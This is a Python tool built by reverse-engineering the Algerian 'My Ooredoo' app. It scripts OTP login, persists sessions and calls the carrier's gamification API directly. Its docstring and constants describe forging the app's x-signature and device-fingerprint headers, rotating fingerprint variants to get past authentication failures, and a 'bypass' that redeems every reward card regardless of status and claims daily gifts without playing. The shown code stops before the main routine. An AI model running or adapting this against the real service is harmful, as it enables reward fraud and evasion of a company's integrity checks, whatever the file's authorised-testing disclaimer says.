#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
===============================================================================
 My Ooredoo (Algeria) v1.5.17 — OTP LOGIN + SESSION CLIENT  [v6 — snake-autoopen]
===============================================================================
 Target app   : My Ooredoo — com.algeria.selfcare.app.android v1.5.17 (1461)
 Source       : static reverse-engineering of 'My Ooredoo_1.5.17.apks'
                (jadx + Blutter Dart-AOT reversal + APK signing-block parse)

 Reconstructed functions (Dart AOT, libapp.so):
   ApiCalls::requestOTPbyMSISDN   @ 0xb905b8  -> SMS OTP dispatch
   ApiCalls::loginWithOTP         @ 0xe3e88c  -> OTP verification grant (otp=)
   ApiCalls::getAccessTokenByOtp  @ 0xe3d204  -> (twin of loginWithOTP)
   ApiCalls::getNonceValidation   @ 0x95c71c  -> checkpoint anti-replay nonce
   ApiCalls::refreshAccessToken   @ 0xb70330  -> grant_type=refresh_token
   ApiCalls::logout               @ 0xc3bb00  -> openid-connect/logout
   ApiCalls::_getCommonHeaders    @ 0x92a350  -> authenticated-call header suite
   ApiCaller::* (Bearer header)   @ 0x95a070  -> Authorization: Bearer <token>
   ApiCalls::setChecksumHeaders   @ 0x92ab94  -> x-signature
   ApiCalls::setDeviceDataGatherForKeycloak @ 0x95c568 -> X-Platform-Info
   ApiCalls::setDeviceFingerprintHeader     @ 0x92a480 -> X-Device-Fingerprint

 POWER OF SNAKE (v5 — gamification module reconstructed; v6 — BYPASS):
   RemotePowerSnakeApi::getPowerSnakes   @ 0xde9bfc -> GET  …/gamification/power-snake?status=AVAILABLE
   RemotePowerSnakeApi::unlockPowerSnake @ 0xdf4388 -> POST …/gamification/power-snake/<uuid>/redeem
       (POST with data:null — ZERO body bytes; module Dio = RegisterModule::dio
        @ 0xb5c64c: NO checkpoint nonce interceptor, BaseOptions pins
        Accept/Content-Type: application/json; _authHeaders @ 0xdf34d8 adds
        Authorization: Bearer + x-msisdn)
   PowerSnakeCubit::unlockPowerSnake     @ 0xdf3ebc -> VERDICT: response.code == 400
       (0x190 @ 0xdf3f40) => SUCCESS + assignedReward, else FAILED(message ??
       'Something went wrong'); DioException => ApiException(data['message'])
   ApiCalls::getGameStatus  @ 0xc4a024 -> GET  …/gamification/status   {played, lastPlayedTime}
   ApiCalls::getGameHistories @ 0xd03e70 -> GET …/gamification/history
   ApiCalls::playGame       @ 0xe89a74 -> GET  …/gamification/play
       (LEGACY layer: DOES run the checkpoint nonce pre-flight first —
        getNonceValidation(msisdn, 'GET', path)); grants the daily spin-wheel
       gift DIRECTLY (game_home_screen parses giftName/validityHour from the
       response @ 0xe89df8 — the wheel/puzzle-snake game is pure client theater)

 v6 "REMOVE THE GAMIFICATION" (user requirement):
   * `autoopen` — the gamification gate is CLIENT-SIDE ONLY (the app merely
     asks `?status=AVAILABLE`, getPowerSnakes @ 0xde9c6c, before letting you
     tap a card). The endpoint happily filters by any other status (or none),
     and redeem doesn't re-check status. So: probe ALL statuses, dedupe,
     POST redeem on EVERY card uuid found — then claim the daily play gift
     via /gamification/play with NO game at all.
   * works even when the app shows "no cards": REDEEMED/EXPIRED/… cards are
     enumerated and redeem-attempted anyway; the daily play gift is claimed
     regardless of cards.

 v6 WIRE-FORMAT FIXES (all AOT-verified; likely fix for the STEP 4 401):
   * X-Device-Fingerprint msg order = TS + INSTANCE-UUID + MSISDN
       (SignatureHelper::generateDeviceFingerprint @ 0x92a630: key = utf8(arg3
       = millis); msg = (arg3 + arg1) + arg2 — two _StringBase::+ stubs with the
       receiver in the HIGH stack slot; verified against the Dio.get call
       pattern). v4/v5 used msisdn+uuid+ts — WRONG concatenation order.
       `--fp-order auto` rotates all 6 orders × 2 encodings on a 401 verify
       and remembers the winning profile in the state file.
   * X-Platform-Info / X-Platform-Data-Signature = Base64(utf8(json))
       (setDeviceDataGatherForKeycloak @ 0x95c568 → X-Platform-Info,
        setDeviceDataGather @ 0x92aab4 → X-Platform-Data-Signature: JsonCodec
        → Utf8Encoder → Base64Codec). v3-v5 sent the raw JSON — invalid.
   * device-id inside that payload = Settings 'uuid' pref — the SAME value as
       X-Instance-Id (setUUIdForUser @ 0x1157168: Uuid.v1() + epoch-millis →
       persisted once; server can trivially cross-check the equality).
       v3-v5 sent a mismatching 16-hex pseudo device-id.
   * X-Correlation-ID = Uuid.v1() + epoch-millis (ApiCalls::getXCorrelationId
       @ 0x92af84) — same construction as the Settings uuid.
   * Power-snake module Dio headers (RegisterModule::dio interceptor
       @ 0xb5d128): X-Platform-Data-Signature (b64), X-Timestamp,
       X-Instance-Id, X-Device-Fingerprint, platform, X-Platform-Origin,
       x-version — and NO x-signature, NO x-force-update, NO X-Platform-Info
       (those belong to the legacy ApiCalls layer only).

 OnboardingMobileMainCubit (validateUser) @ 0xe3b0fc-0xe3b134:
       resetMsisdn -> validateUser -> Settings::setMSISDN  <- the MSISDN is
       persisted BEFORE the OTP-verify screen, so the verify grant's
       X-Device-Fingerprint msg includes it (FP-MODE 'auto').

 SESSION PRESERVATION (v4 headline feature):
   * after LOGGED IN SUCCESSFULLY the process enters an interactive SESSION
     SHELL: the tokens live in memory for the whole session and every command
     (status/ping/call/refresh/resend/relog/logout) runs with the app's full
     authenticated header suite (Authorization: Bearer …);
   * the session is ALSO persisted to the state file (mirroring the app's
     Settings storage of access/refresh tokens): rerun the script and it
     resumes the session without a new OTP (or silently refreshes the access
     token via grant_type=refresh_token if it expired);
   * `logout` posts the Keycloak logout endpoint (client_id+refresh_token)
     and clears the persisted session.

 FLOW:
   STEP 1  POST /api/ooredoo-bff/checkpoint/token            <- anti-replay
   STEP 2  POST .../openid-connect/token  (username grant)    <- SMS dispatch
           NOTE (field-observed): dispatch may answer 401/403-empty while the
           SMS is STILL dispatched — treated as "submitted".
   [WAIT]  user types the received code ('r'=resend). Retry loop on failure —
           always use the code from the LATEST SMS.
   STEP 3  fresh checkpoint nonce (loginWithOTP re-runs getNonceValidation)
   STEP 4  POST .../openid-connect/token  (username + otp=<CODE>) <- login
           success = 2xx + access_token (cubit closure @ 0xe3d730)
   SESSION  interactive shell + persisted tokens + refresh/resume/logout.

 LEGAL: for use ONLY in controlled/authorized security-testing environments
 against numbers you own or are authorized to test. No liability for misuse.
===============================================================================
"""

import argparse
import base64
import hashlib
import hmac as hmac_mod
import json
import logging
import os
import secrets
import sys
import time
import uuid
from datetime import datetime

try:
    import requests
    import urllib3
except ImportError:  # pragma: no cover
    sys.stderr.write("[!] 'requests' is required:  pip install requests\n")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Static configuration recovered from the APK (Dart string pool / asm / dex)
# ---------------------------------------------------------------------------
BASE_URL = "https://apis.ooredoo.dz"
EP_NONCE = "/api/ooredoo-bff/checkpoint/token"
EP_TOKEN = "/api/auth/realms/myooredoo/protocol/openid-connect/token"
EP_LOGOUT = "/api/auth/realms/myooredoo/protocol/openid-connect/logout"
EP_AUTHPING = "/api/ooredoo-bff/users/authping"

# --- Power of Snake / gamification (features/power_snake + api_calls.dart) ---
EP_SNAKES = "/api/ooredoo-bff/gamification/power-snake"       # ?status=AVAILABLE
EP_GAME_STATUS = "/api/ooredoo-bff/gamification/status"       # {played, lastPlayedTime}
EP_GAME_HISTORY = "/api/ooredoo-bff/gamification/history"
EP_GAME_PLAY = "/api/ooredoo-bff/gamification/play"           # legacy: needs nonce
CLIENT_ID = "myooredoo-app"
APP_VERSION = "1.5.17"
USER_AGENT = "Dart/3.11 (dart:io)"
COUNTRY_CODE = "213"

# --- v6: gamification-bypass probes -------------------------------------------
# The app only ever asks status=AVAILABLE (getPowerSnakes @ 0xde9c6c); the
# BFF accepts any status filter (or none). REDEEMED/EXPIRED appear in the
# PowerSnakeItemModel; the rest are speculative candidates probed anyway.
SNAKE_STATUS_PROBES = ("AVAILABLE", "REDEEMED", "EXPIRED", "LOCKED", "PENDING",
                        "EARNED", "USED", "IN_PROGRESS", "CLAIMED", "ACTIVE")
# v6: X-Device-Fingerprint message concatenation orders (see docstring).
FP_ORDERS = ("ts-uuid-msisdn", "msisdn-uuid-ts", "uuid-ts-msisdn",
             "uuid-msisdn-ts", "ts-msisdn-uuid", "msisdn-ts-uuid")
# Runtime fingerprint profile — initialized from args + saved state in main();
# the STEP-4 auto-rotation updates it and the winner is persisted in the state.
FP_PROFILE = {"fp_order": "ts-uuid-msisdn", "plain_platform_info": False}

# --- x-signature: computed from the GENUINE My Ooredoo 1.5.17 base.apk ------
APK_CHECKSUM = "3138619328"                               # CRC32(classes.dex)
APK_SIGNATURE = "KLYDvjaYq0SFAMqFTaEzMX0kQVR402qzUftEhMp6jyU="
X_SIGNATURE = hashlib.sha256(
    (APK_CHECKSUM + APK_SIGNATURE + "\n").encode()
).hexdigest()  # Android Base64 flag-0 appends a trailing newline before hashing
X_SIGNATURE_RAW = hashlib.sha256(
    (APK_CHECKSUM + APK_SIGNATURE).encode()
).hexdigest()

APP_HEADERS = {
    "platform": "android",
    "X-Platform-Origin": "mobile-android",
    "x-version": APP_VERSION,
    "x-force-update": "true",
}

LOG = logging.getLogger("ooredoo-login")


# ---------------------------------------------------------------------------
# MSISDN normalization — local 05XXXXXXXX -> Keycloak 213XXXXXXXXX
# ---------------------------------------------------------------------------
def normalize_msisdn(raw: str) -> str:
    digits = "".join(c for c in raw if c.isdigit())
    if not digits:
        raise ValueError("no digits in MSISDN")
    if digits.startswith("00213"):
        digits = digits[2:]
    if digits.startswith(COUNTRY_CODE) and len(digits) >= 12:
        return digits
    if digits.startswith("0"):
        digits = digits[1:]
    if len(digits) == 9:
        digits = COUNTRY_CODE + digits
    elif not digits.startswith(COUNTRY_CODE):
        digits = COUNTRY_CODE + digits.lstrip("0")
    return digits


# ---------------------------------------------------------------------------
# Persistent state: pseudo-device + saved session (mirrors app Settings)
# ---------------------------------------------------------------------------
def load_state(state_file: str) -> dict:
    if os.path.exists(state_file):
        try:
            with open(state_file, "r", encoding="utf-8") as fh:
                data = json.load(fh)
            if isinstance(data, dict) and "uuid" in data:
                data.setdefault("session", None)
                data.setdefault("fp_profile", None)
                return data
        except Exception:
            pass
    # setUUIdForUser @ 0x1157168: Settings 'uuid' = Uuid.v1() + epoch-millis
    return {"uuid": f"{uuid.uuid1()}{int(time.time() * 1000)}",
            "device_id": secrets.token_hex(8),     # legacy v4 pseudo id (kept
            "session": None, "fp_profile": None}    #  for --plain-platform-info)


def save_state(state_file: str, state: dict) -> None:
    try:
        with open(state_file, "w", encoding="utf-8") as fh:
            json.dump(state, fh, indent=2)
    except Exception as exc:
        LOG.warning("[!] could not persist state (%s)", exc)


def session_from_tokens(msisdn: str, tokens: dict) -> dict:
    return {
        "msisdn": msisdn,
        "access_token": tokens.get("access_token", ""),
        "refresh_token": tokens.get("refresh_token", ""),
        "expires_at": jwt_exp(tokens.get("access_token")) or (
            time.time() + float(tokens.get("expires_in") or 300)),
        "refresh_expires_at": jwt_exp(tokens.get("refresh_token")) or (
            time.time() + float(tokens.get("refresh_expires_in") or 1800)),
        "captured_at": datetime.now().isoformat(timespec="seconds"),
        "scope": tokens.get("scope", ""),
    }


# ---------------------------------------------------------------------------
# JWT helpers (no external deps)
# ---------------------------------------------------------------------------
def decode_jwt_payload(token: str) -> dict | None:
    try:
        seg = token.split(".")[1]
        seg += "=" * (-len(seg) % 4)
        return json.loads(base64.urlsafe_b64decode(seg).decode("utf-8", "replace"))
    except Exception:
        return None


def jwt_exp(token: str) -> float | None:
    if not token:
        return None
    payload = decode_jwt_payload(token)
    exp = (payload or {}).get("exp")
    return float(exp) if isinstance(exp, (int, float)) else None


def token_seconds_left(token: str, fallback_exp: float | None = None) -> float | None:
    exp = jwt_exp(token)
    if exp is None:
        exp = fallback_exp
    return None if exp is None else exp - time.time()


# ---------------------------------------------------------------------------
# Logging helpers — pentest-grade, full-wire documentation
# ---------------------------------------------------------------------------
def setup_logging(logfile: str | None, verbose: bool) -> None:
    LOG.setLevel(logging.DEBUG)
    LOG.handlers.clear()
    fmt = logging.Formatter("%(asctime)s | %(levelname)-8s | %(message)s", "%H:%M:%S")
    con = logging.StreamHandler(sys.stdout)
    con.setLevel(logging.DEBUG if verbose else logging.INFO)
    con.setFormatter(fmt)
    LOG.addHandler(con)
    if logfile:
        fh = logging.FileHandler(logfile, mode="w", encoding="utf-8")
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter("%(asctime)s | %(levelname)-8s | %(message)s"))
        LOG.addHandler(fh)
        LOG.info("Log file: %s", os.path.abspath(logfile))


def banner() -> None:
    LOG.info("=" * 76)
    LOG.info("My Ooredoo 1.5.17 — OTP LOGIN + SESSION + POWER-OF-SNAKE CLIENT  [v6]")
    LOG.info("Reconstructed: requestOTPbyMSISDN @ 0xb905b8, loginWithOTP @ 0xe3e88c,")
    LOG.info("               getPowerSnakes @ 0xde9bfc, unlockPowerSnake @ 0xdf4388")
    LOG.info("               snake autoopen — gamification bypass: probe ALL card")
    LOG.info("               statuses, redeem every card, claim the daily play gift")
    LOG.info("               directly (spin-wheel / puzzle-snake game SKIPPED).")
    LOG.info("=" * 76)


def log_request(prep: requests.PreparedRequest) -> None:
    LOG.info("-" * 76)
    LOG.info(">> REQUEST  %s %s", prep.method, prep.url)
    for k, v in (prep.headers or {}).items():
        shown = v
        if k.lower() == "authorization" and len(v) > 60:
            shown = v[:44] + "…(redacted in log)"
        LOG.info(">> H  %s: %s", k, shown)
    body = prep.body or ""
    if isinstance(body, bytes):
        try:
            body = body.decode("utf-8", "replace")
        except Exception:
            body = repr(body)
    if body:
        LOG.info(">> BODY  %s", body)


def log_response(resp: requests.Response) -> None:
    LOG.info("-- RESPONSE  HTTP %s %s  (%d bytes, %.0f ms)",
             resp.status_code, resp.reason, len(resp.content or b""),
             resp.elapsed.total_seconds() * 1000)
    for k, v in resp.headers.items():
        LOG.info("-- H  %s: %s", k, v)
    text = resp.text if resp.text else "(empty body)"
    try:
        LOG.info("-- BODY (pretty JSON):\n%s", json.dumps(json.loads(text), indent=2, ensure_ascii=False))
    except (ValueError, TypeError):
        LOG.info("-- BODY (raw):\n%s", text)
    LOG.info("-" * 76)


def do_request(session: requests.Session, prep: requests.PreparedRequest,
               timeout: float) -> requests.Response:
    log_request(prep)
    try:
        resp = session.send(prep, timeout=timeout)
    except requests.exceptions.SSLError as exc:
        LOG.error("[!] TLS error: %s", exc)
        raise SystemExit(2)
    except requests.exceptions.ConnectTimeout:
        LOG.error("[!] Connection timeout after %.1fs", timeout)
        raise SystemExit(2)
    except requests.exceptions.ConnectionError as exc:
        LOG.error("[!] Connection error: %s", exc)
        raise SystemExit(2)
    log_response(resp)
    return resp


def parse_extra_headers(items: list[str] | None) -> dict[str, str]:
    out: dict[str, str] = {}
    for it in items or []:
        if ":" not in it:
            LOG.warning("[!] ignoring malformed --extra-header: %r", it)
            continue
        k, v = it.split(":", 1)
        out[k.strip()] = v.strip()
    return out


# ---------------------------------------------------------------------------
# Device header bundle — v6, layer-faithful to the Dart AOT disassembly
#
# FP-MODE (X-Device-Fingerprint stored-msisdn binding — see docstring):
#   auto   : "" for the dispatch pair (field-verified working), MSISDN for
#            the verify grant and all authenticated session traffic (app has
#            Settings::setMSISDN persisted by then — OnboardingMobileMainCubit
#            @ 0xe3b134)
#   empty  : always "" (v3 behavior)
#   msisdn : always the MSISDN
#
# FP-ORDER (v6): SignatureHelper::generateDeviceFingerprint @ 0x92a630 —
#   key   = utf8(millis)
#   msg   = (millis + instance_uuid) + msisdn      ← AOT stub operand order
#   The 6 permutations stay selectable (--fp-order) because this is the
#   prime suspect for the historical STEP-4 401; 'auto' rotates them all.
# ---------------------------------------------------------------------------
def correlation_id() -> str:
    """ApiCalls::getXCorrelationId @ 0x92af84 — Uuid.v1() + epoch-millis."""
    return f"{uuid.uuid1()}{int(time.time() * 1000)}"


def platform_payload(device: dict, plain_legacy: bool) -> str:
    """setDeviceDataGatherForKeycloak @ 0x95c568 / setDeviceDataGather @
    0x92aab4: {platform, is-physical-device, device-id}. device-id =
    Settings 'uuid' (== X-Instance-Id; setUUIdForUser @ 0x1157168)."""
    if plain_legacy:                      # v3-v5 raw behavior (A/B fallback)
        return json.dumps(
            {"platform": "android", "is-physical-device": True,
             "device-id": device.get("device_id", device["uuid"])},
            separators=(",", ":"), sort_keys=False)
    return json.dumps(
        {"platform": "android", "is-physical-device": True,
         "device-id": device["uuid"]},
        separators=(",", ":"), sort_keys=False)


def platform_headers(device: dict) -> dict[str, str]:
    """JsonCodec → Utf8Encoder → Base64Codec — BOTH data-gather variants.
    requestAuth (@ 0x959c04) plausibly carries X-Platform-Info on top of the
    common headers' X-Platform-Data-Signature; we send both (same b64 value)."""
    if FP_PROFILE["plain_platform_info"]:
        return {"X-Platform-Info": platform_payload(device, True)}
    b64 = base64.b64encode(platform_payload(device, False).encode("utf-8")).decode("ascii")
    return {"X-Platform-Info": b64, "X-Platform-Data-Signature": b64}


def generate_fingerprint(device: dict, fp_msisdn: str, ts: str, order: str) -> str:
    """HMAC-SHA256(key=utf8(ts), msg=order-joined parts).hexdigest()."""
    parts = {"ts": ts, "uuid": device["uuid"], "msisdn": fp_msisdn or ""}
    a, b, c = order.split("-")
    msg = (parts[a] + parts[b] + parts[c]).encode()
    return hmac_mod.new(ts.encode(), msg, hashlib.sha256).hexdigest()


def device_headers(device: dict, fp_msisdn: str) -> dict[str, str]:
    """LEGACY ApiCalls layer (checkpoint + Keycloak grants + requestAuth BFF):
    x-signature + platform data headers + fingerprint triplet."""
    ts = str(int(time.time() * 1000))
    return {
        "x-signature": X_SIGNATURE,                    # setChecksumHeaders @ 0x92ab94
        **platform_headers(device),                    # X-Platform-Info / -Data-Signature
        "X-Timestamp": ts,                            # setDeviceFingerprintHeader @ 0x92a480
        "X-Instance-Id": device["uuid"],
        "X-Device-Fingerprint": generate_fingerprint(
            device, fp_msisdn, ts, FP_PROFILE["fp_order"]),
    }


def dio_headers(device: dict, fp_msisdn: str) -> dict[str, str]:
    """RegisterModule::dio interceptor @ 0xb5d128 (power-snake module):
    setDeviceDataGather → X-Platform-Data-Signature (b64) + fingerprint
    triplet — and NO x-signature, NO X-Platform-Info (legacy-only headers)."""
    ts = str(int(time.time() * 1000))
    return {
        "X-Platform-Data-Signature": base64.b64encode(
            platform_payload(device, FP_PROFILE["plain_platform_info"])
            .encode("utf-8")).decode("ascii"),
        "X-Timestamp": ts,
        "X-Instance-Id": device["uuid"],
        "X-Device-Fingerprint": generate_fingerprint(
            device, fp_msisdn, ts, FP_PROFILE["fp_order"]),
    }


def fp_candidates(args, state: dict) -> list[tuple[str, bool]]:
    """STEP-4 fingerprint/profile variants to try (winner is persisted)."""
    saved = state.get("fp_profile") or {}
    if args.fp_order != "auto":
        return [(args.fp_order, args.plain_platform_info)]
    b64 = [(o, False) for o in FP_ORDERS]          # app-faithful encoding first
    plain = [(o, True) for o in FP_ORDERS]         # v4 legacy fallback
    combos = b64 + plain
    # if a previous run already found the winning profile, lead with it
    if saved.get("fp_order"):
        lead = (saved["fp_order"], bool(saved.get("plain_platform_info")))
        combos = [lead] + [c for c in combos if c != lead]
    return combos


def apply_fp_profile(cand: tuple[str, bool]) -> None:
    FP_PROFILE["fp_order"] = cand[0]
    FP_PROFILE["plain_platform_info"] = cand[1]


def fp_for(state: dict, fp_mode: str, phase: str) -> str:
    """phase: 'dispatch' | 'verify' | 'session'"""
    if fp_mode == "empty":
        return ""
    if fp_mode == "msisdn":
        return state.get("session", {}).get("msisdn", "") or state.get("_login_msisdn", "")
    # auto
    if phase == "dispatch":
        return ""
    return (state.get("session", {}) or {}).get("msisdn", "") or state.get("_login_msisdn", "")


# ---------------------------------------------------------------------------
# STEP 1 — checkpoint nonce (ApiCalls::getNonceValidation)
# ---------------------------------------------------------------------------
def get_nonce(session: requests.Session, base: str, msisdn: str,
              extra: dict[str, str], device: dict, timeout: float,
              fp_msisdn: str, path: str = EP_TOKEN,
              method: str = "POST") -> tuple[str, str]:
    url = base + EP_NONCE
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": USER_AGENT,
        "x-msisdn": msisdn,
        "x-path": path,
        "x-method": method,
        "X-Correlation-ID": correlation_id(),
        **APP_HEADERS,
        **device_headers(device, fp_msisdn),
        **extra,
    }
    prep = session.prepare_request(requests.Request("POST", url, headers=headers, data={}))
    LOG.info("[NONCE] checkpoint — anti-replay pre-flight (x-path=%s, x-method=%s)",
             path, method)
    resp = do_request(session, prep, timeout)
    nonce_id = resp.headers.get("x-nonce-id", "")
    chronos_id = resp.headers.get("x-chronos-id", "")
    if resp.ok and nonce_id:
        LOG.info("[+] nonce acquired  x-nonce-id=%s  x-chronos-id=%s",
                 nonce_id, chronos_id or "(absent)")
    else:
        LOG.warning("[!] checkpoint gave HTTP %s / nonce=%r — continuing "
                    "(app tolerates empty nonce @ 0xb908f8).", resp.status_code, nonce_id)
    return nonce_id, chronos_id


# ---------------------------------------------------------------------------
# STEP 2 — the OTP send (ApiCalls::requestOTPbyMSISDN)
# ---------------------------------------------------------------------------
def request_otp(session: requests.Session, base: str, msisdn: str,
                nonce_id: str, chronos_id: str, resend: bool,
                extra: dict[str, str], device: dict, timeout: float,
                fp_msisdn: str) -> requests.Response:
    url = base + EP_TOKEN
    form = {
        "client_id": CLIENT_ID,
        "grant_type": "password",
        "username": msisdn,
    }
    if resend:
        form["resend"] = "true"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "User-Agent": USER_AGENT,
        "x-msisdn": msisdn,
        "x-nonce-id": nonce_id,
        "x-chronos-id": chronos_id,
        "X-Correlation-ID": correlation_id(),
        **APP_HEADERS,
        **device_headers(device, fp_msisdn),
        **extra,
    }
    prep = session.prepare_request(requests.Request("POST", url, headers=headers, data=form))
    LOG.info("[STEP 2] OTP request — requestOTPbyMSISDN%s", " (resend)" if resend else "")
    return do_request(session, prep, timeout)


# ---------------------------------------------------------------------------
# STEP 4 — OTP verification / login (ApiCalls::loginWithOTP @ 0xe3e88c)
# ---------------------------------------------------------------------------
def login_with_otp(session: requests.Session, base: str, msisdn: str, otp: str,
                   nonce_id: str, chronos_id: str, extra: dict[str, str],
                   device: dict, timeout: float, fp_msisdn: str,
                   password_param: bool) -> requests.Response:
    url = base + EP_TOKEN
    form = {
        "client_id": CLIENT_ID,
        "grant_type": "password",
        "username": msisdn,
        ("password" if password_param else "otp"): otp,   # @ 0xe3eb24 ("otp")
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "User-Agent": USER_AGENT,
        "x-msisdn": msisdn,
        "x-nonce-id": nonce_id,
        "x-chronos-id": chronos_id,
        "X-Correlation-ID": correlation_id(),
        **APP_HEADERS,
        **device_headers(device, fp_msisdn),
        **extra,
    }
    prep = session.prepare_request(requests.Request("POST", url, headers=headers, data=form))
    LOG.info("[STEP 4] OTP verification — loginWithOTP (param '%s')",
             "password" if password_param else "otp")
    return do_request(session, prep, timeout)


# ---------------------------------------------------------------------------
# Refresh grant (ApiCalls::refreshAccessToken @ 0xb70330)
# ---------------------------------------------------------------------------
def refresh_grant(session: requests.Session, base: str, msisdn: str,
                  refresh_token: str, nonce_id: str, chronos_id: str,
                  extra: dict[str, str], device: dict, timeout: float,
                  fp_msisdn: str) -> requests.Response:
    url = base + EP_TOKEN
    form = {
        "client_id": CLIENT_ID,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "User-Agent": USER_AGENT,
        "x-msisdn": msisdn,
        "x-nonce-id": nonce_id,
        "x-chronos-id": chronos_id,
        "X-Correlation-ID": correlation_id(),
        **APP_HEADERS,
        **device_headers(device, fp_msisdn),
        **extra,
    }
    prep = session.prepare_request(requests.Request("POST", url, headers=headers, data=form))
    LOG.info("[REFRESH] grant_type=refresh_token (ApiCalls::refreshAccessToken @ 0xb70330)")
    return do_request(session, prep, timeout)


# ---------------------------------------------------------------------------
# Keycloak logout (ApiCalls::logout @ 0xc3bb00 — _getCommonHeaders, no nonce)
# ---------------------------------------------------------------------------
def keycloak_logout(session: requests.Session, base: str, msisdn: str,
                    refresh_token: str, access_token: str,
                    extra: dict[str, str], device: dict, timeout: float,
                    fp_msisdn: str) -> requests.Response:
    url = base + EP_LOGOUT
    form = {
        "client_id": CLIENT_ID,
        "refresh_token": refresh_token,
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "User-Agent": USER_AGENT,
        "Authorization": f"Bearer {access_token}",
        "x-msisdn": msisdn,
        "X-Correlation-ID": correlation_id(),
        **APP_HEADERS,
        **device_headers(device, fp_msisdn),
        **extra,
    }
    prep = session.prepare_request(requests.Request("POST", url, headers=headers, data=form))
    LOG.info("[LOGOUT] openid-connect/logout (ApiCalls::logout @ 0xc3bb00)")
    return do_request(session, prep, timeout)


# ---------------------------------------------------------------------------
# Authenticated call (ApiCaller Authorization: Bearer + _getCommonHeaders)
# ---------------------------------------------------------------------------
def authed_call(session: requests.Session, base: str, msisdn: str, access_token: str,
                method: str, path: str, body: dict | None,
                extra: dict[str, str], device: dict, timeout: float,
                fp_msisdn: str, nonce_id: str = "", chronos_id: str = "") -> requests.Response:
    """Legacy ApiCaller.requestAuth (@ 0x959c04): _getCommonHeaders + Bearer +
    x-msisdn (+ x-signature + X-Platform-Info per requestAuth internals) —
    optional x-nonce-id/x-chronos-id for endpoints that pre-flight the
    checkpoint (e.g. gamification/play via playGame @ 0xe89a74)."""
    if not path.startswith("/"):
        path = "/" + path
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Authorization": f"Bearer {access_token}",
        "x-msisdn": msisdn,
        "X-Correlation-ID": correlation_id(),
        **APP_HEADERS,
        **device_headers(device, fp_msisdn),
        **extra,
    }
    if nonce_id:
        headers["x-nonce-id"] = nonce_id
        headers["x-chronos-id"] = chronos_id
    data = None
    if body is not None or method.upper() in ("POST", "PUT", "PATCH"):
        headers["Content-Type"] = "application/json"
        data = json.dumps(body if body is not None else {})
    prep = session.prepare_request(
        requests.Request(method.upper(), base + path, headers=headers, data=data))
    LOG.info("[CALL] authenticated %s %s", method.upper(), path)
    return do_request(session, prep, timeout)


# ---------------------------------------------------------------------------
# POWER OF SNAKE — gamification module (features/power_snake, module Dio)
#
# Fidelity notes (all verified in the Dart AOT disassembly):
#   * Transport : RegisterModule::dio @ 0xb5c64c — BaseOptions pins
#                 Accept: application/json + Content-Type: application/json;
#                 interceptor @ 0xb5d128 adds X-Correlation-ID (uuid1+millis),
#                 X-Platform-Data-Signature (b64 device data), X-Timestamp,
#                 X-Instance-Id, X-Device-Fingerprint, platform,
#                 X-Platform-Origin, x-version. It does NOT add x-signature,
#                 x-force-update or X-Platform-Info (legacy-only) and there
#                 is NO checkpoint nonce interceptor => x-nonce-id is NEVER
#                 sent by this module.
#   * _authHeaders @ 0xdf34d8 : per-call {Authorization: Bearer <token>,
#                 x-msisdn} (master vs slave token via Settings::getIsMaster).
#   * getPowerSnakes @ 0xde9bfc : GET <EP_SNAKES>?status=<STATUS> →
#                 PowerSnakeModel {total:int, items:[PowerSnakeItemModel]}
#                 (the app hardcodes AVAILABLE — any other filter or none is
#                 equally valid; that filter IS the 'gamification gate').
#   * unlockPowerSnake @ 0xdf4388 : POST <EP_SNAKES>/<uuid>/redeem with
#                 data:null → ZERO body bytes (Dio sends Content-Length: 0).
#   * PowerSnakeRedeemResponse {message:str?, code:num?, assignedReward:{...}?}
#   * VERDICT (PowerSnakeCubit @ 0xdf3f40): code == 400 → SUCCESS (show
#                 assignedReward, then re-list), anything else → FAILED
#                 (message ?? 'Something went wrong').
# ---------------------------------------------------------------------------
def snake_call(session: requests.Session, base: str, msisdn: str, access_token: str,
               method: str, path: str, extra: dict[str, str], device: dict,
               timeout: float, fp_msisdn: str, body: dict | None = None,
               nonce_id: str = "", chronos_id: str = "") -> requests.Response:
    """RemotePowerSnakeApi-style call (module Dio, Bearer + x-msisdn)."""
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Content-Type": "application/json",     # module Dio BaseOptions default
        "Authorization": f"Bearer {access_token}",
        "x-msisdn": msisdn,                     # _authHeaders @ 0xdf34d8
        "X-Correlation-ID": correlation_id(),   # Dio interceptor @ 0xb5d128
        "platform": "android",                  # …/ X-Platform-Origin /
        "X-Platform-Origin": "mobile-android", #  x-version — but NO
        "x-version": APP_VERSION,               #  x-signature/x-force-update
        **dio_headers(device, fp_msisdn),
        **extra,
    }
    if nonce_id:
        headers["x-nonce-id"] = nonce_id
        headers["x-chronos-id"] = chronos_id
    # Dio post(..., data: null) => ZERO body bytes: pass data=None
    data = None if body is None else json.dumps(body)
    prep = session.prepare_request(
        requests.Request(method.upper(), base + path, headers=headers, data=data))
    LOG.info("[SNAKE] %s %s", method.upper(), path)
    return do_request(session, prep, timeout)


def snake_reward_summary(assigned) -> str:
    """Cubit success branch @ 0xdf3f7c-0xdf40c0:
       reward_type  = assignedReward.type
       reward_value = reward['unlimited-usage'] non-empty  ? 'unlimited'
                      : '<usage-value> <usage-unit>'  (each 'N/A' when null)
       + validity suffix from the RewardDetailsModel fields."""
    if not isinstance(assigned, dict):
        return "(no reward data)"
    rtype = assigned.get("type") or "?"
    details = assigned.get("reward")
    if isinstance(details, dict):
        if details.get("unlimited-usage"):          # non-null AND non-empty
            value = "unlimited"
        else:
            value = "{} {}".format(details.get("usage-value") or "N/A",
                                   details.get("usage-unit") or "N/A")
        validity = details.get("validity")
        vunit = details.get("validity-unit")
        vsuffix = f" · validity {validity} {vunit or ''}".rstrip() if validity else ""
        return f"{rtype} — {value}{vsuffix}"
    if isinstance(details, str) and details:
        return f"{rtype} — {details}"
    return rtype


